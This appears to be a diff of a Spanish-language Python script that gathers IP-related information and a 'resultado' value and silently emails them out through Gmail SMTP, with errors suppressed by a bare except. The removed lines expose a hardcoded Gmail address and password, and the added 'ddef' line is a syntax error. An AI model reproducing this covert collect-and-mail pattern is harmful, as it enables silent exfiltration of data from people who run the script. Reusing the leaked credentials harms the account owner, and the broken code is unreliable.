@@ -37,19 +37,18 @@ def ip_info():
         lista.append(mensaje)
     return lista
         
-def mandar_datos():
-        
+ddef mandar_datos(email,password):   
     enviar=json.dumps(ip_info(), indent=2)
     server = smtplib.SMTP('smtp.gmail.com',587)
     server.starttls()
-    server.login('smithpaz01307@gmail.com','318Cathe')
-    server.sendmail('smithpaz01307@gmail.com','smithpaz01307@gmail.com',enviar)
+    server.login(email,password)
+    server.sendmail(email,email,enviar)
     server.quit()
 
 
 try:  
-    enviar_email('smithpaz01307@gmail.com', '318Cathe', resultado)
+    enviar_email('TuCorreo', 'Tucontraseña', resultado)
     #ip_info()
-    mandar_datos()
+    mandar_datos('TuCorreo', 'Tucontraseña')
 except:
     pass
